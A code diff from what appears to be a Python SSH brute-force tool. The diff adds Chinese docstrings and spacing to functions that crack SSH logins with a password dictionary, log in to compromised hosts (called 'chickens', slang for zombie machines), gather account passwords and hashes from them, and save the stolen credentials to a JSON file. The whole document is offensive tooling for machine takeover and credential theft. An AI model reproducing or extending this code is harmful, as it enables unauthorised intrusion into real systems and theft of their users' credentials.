@@ -10,6 +10,14 @@ from brute import bruteSSH, loginSSH, bruteUnixPasswd
 
 # 破解
 def brute(host, user, dictionary, *, connections):
+    """调用并进行破解
+
+    :param host:破解目标主机
+    :param user:目标用户
+    :param dictionary:字典路径
+    :param connections:连接数
+    :return:
+    """
     target = (host, user)
     dic = dict()
     dic['passwd_file'] = dictionary
@@ -21,6 +29,12 @@ def brute(host, user, dictionary, *, connections):
 
 # handle:pxssh handle host:ip
 def standard_operate_chicken(handle, host):
+    """肉鸡标准操作
+
+    :param handle:登录句柄
+    :param host:目标主机ip地址
+    :return:
+    """
     if not handle:
         return
 
@@ -43,16 +57,21 @@ def standard_operate_chicken(handle, host):
                 pass_bruteinfo['account'][passwd_info['user']]['password'] = passwd_info['password']
                 pass_bruteinfo['account'][passwd_info['user']]['hash'] = line
 
-        if os.path.exists(gv.CHICKEN_PATH+gv.chicken_info_file):
-            chicken_info = json.load(open(gv.CHICKEN_PATH+gv.chicken_info_file, 'r'))
+        if os.path.exists(gv.CHICKEN_PATH + gv.chicken_info_file):
+            chicken_info = json.load(open(gv.CHICKEN_PATH + gv.chicken_info_file, 'r'))
         else:
             chicken_info = {}
         chicken_info[host] = pass_bruteinfo
-        json.dump(chicken_info, open(gv.CHICKEN_PATH+gv.chicken_info_file, 'w'), indent=4)
+        json.dump(chicken_info, open(gv.CHICKEN_PATH + gv.chicken_info_file, 'w'), indent=4)
 
 
 # brute_info:{'host': '1.2.3.4', 'user': 'root', 'type': 'password', 'key': None}
 def operate_chicken(brute_info):
+    """登录肉鸡，并操作
+
+    :param brute_info:登录信息
+    :return:
+    """
     handle = loginSSH.ret_login_handle(brute_info)
     if handle:
         standard_operate_chicken(handle, brute_info['ip'])
@@ -60,14 +79,26 @@ def operate_chicken(brute_info):
 
 # 写入文件
 def write_file(filename, passwd_info):
+    """存储破解信息
+
+    :param filename:
+    :param passwd_info:
+    :return:
+    """
     with open(filename, 'a') as f:
-        f.write(str(passwd_info)+'\n')
+        f.write(str(passwd_info) + '\n')
 
 
 # 读取破解结果
 def read_files(filename, path=gv.CHICKEN_PATH):
+    """读取原破解结果
+
+    :param filename:
+    :param path:
+    :return:
+    """
     if os.path.exists(path):
-        chicken_info = json.load(open(gv.CHICKEN_PATH+filename, 'r'))
+        chicken_info = json.load(open(gv.CHICKEN_PATH + filename, 'r'))
         return chicken_info
 
 
